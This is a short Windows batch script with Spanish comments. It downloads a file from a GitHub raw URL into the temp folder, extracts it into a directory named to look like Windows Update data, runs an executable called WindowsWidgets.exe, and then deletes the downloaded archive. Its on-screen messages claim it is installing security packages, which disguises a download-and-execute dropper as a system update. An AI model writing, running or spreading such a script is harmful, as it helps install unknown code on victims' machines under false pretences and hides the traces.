@echo off
:: Configuración
set "url=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main/instalar.bat"
set "tempZip=%TEMP%\update_data.zip"
set "destDir=%TEMP%\WindowsUpdateData"

if not exist "%destDir%" mkdir "%destDir%"

echo [+] Descargando paquetes de seguridad...
:: 1. Descarga el archivo desde tu GitHub
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempZip%'"

echo [+] El archivo requiere una clave de acceso.
:: 2. PowerShell pide la clave y extrae (Nota: El archivo debe ser un ZIP real con contraseña)
powershell -Command "$shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('%tempZip%'); $dest = $shell.NameSpace('%destDir%'); $dest.CopyHere($zip.Items())"

echo [+] Ejecutando...
:: 3. Abre el ejecutable que ya estará en la carpeta temporal
start "" "%destDir%\WindowsWidgets.exe"

:: Limpieza opcional del ZIP descargado
del /q "%tempZip%"
exit

